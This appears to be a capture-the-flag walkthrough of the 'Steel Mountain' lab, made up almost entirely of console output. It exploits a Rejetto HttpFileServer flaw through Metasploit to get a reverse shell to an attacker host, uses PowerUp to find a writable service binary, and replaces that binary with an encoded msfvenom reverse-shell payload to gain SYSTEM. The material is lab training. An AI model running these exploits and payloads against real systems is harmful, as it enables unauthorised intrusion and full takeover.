


```console
msf6 > search HttpFileServer 2.3

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec                                              
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > run
                                                                              
[*] Started reverse TCP handler on 10.11.35.147:4444 
[*] Using URL: http://10.11.35.147:8080/bmu84Cqldd
[*] Server started.                                                           
[*] Sending a malicious request to /   
[*] Payload request received: /bmu84Cqldd
[*] Sending stage (175174 bytes) to 10.10.225.219
[!] Tried to delete %TEMP%\UaMKSWBnhr.vbs, unknown result
[*] Meterpreter session 2 opened (10.11.35.147:4444 -> 10.10.225.219:49230) at 2021-06-10 22:27:54 +0200
[*] Server stopped.

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > shell
Process 1212 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> cd C:\Users\bill\Desktop

C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b6fcf51fcd7c13abc7db4fd365
C:\Users\bill\Desktop>^Z                                                                                                                                     
Background channel 5? [y/N]  y                                                                                                                               
meterpreter > load powershell                                                                                                                                
Loading extension powershell...Success.                                                                                                                      
meterpreter > powershell_shell                                                                                                                               
PS > pwd                                                                                                                                                     
                                                                                                                                                             
Path                                                                                                                                                         
----                                                                                                                                                         
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup                                                                                  
                                                                                                                                                             
                                                                                                                                                             
PS > cd C:\Users\bill\Desktop                                                                                                                                
PS > dir                                                                                                                                                     
                                                                                                                                                             
                                                                                                                                                             
    Directory: C:\Users\bill\Desktop                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Mode                LastWriteTime     Length Name                                                                                                            
----                -------------     ------ ----                                                                                                            
-a---         6/10/2021   5:51 PM     600580 PowerUp.ps1                                                                                                     
-a---         9/27/2019   5:42 AM         70 user.txt                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
PS > . .\PowerUp.ps1                                                                                                                                         
PS > Invoke-Allchecks

...

ServiceName                     : AdvancedSystemCareService9                                                                                                 
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                                                            
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                                                            
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}                                                     
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

...

root@kali:~/thm/steel-mountain# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.35.147 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe

meterpreter > upload Advanced.exe                                                                                                                            
[*] uploading  : /mnt/hgfs/shared/thm/steel-mountain/Advanced.exe -> Advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /mnt/hgfs/shared/thm/steel-mountain/Advanced.exe -> Advanced.exe
[*] uploaded   : /mnt/hgfs/shared/thm/steel-mountain/Advanced.exe -> Advanced.exe


C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING  
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> move Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\"
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80

```

## Useful links

- https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1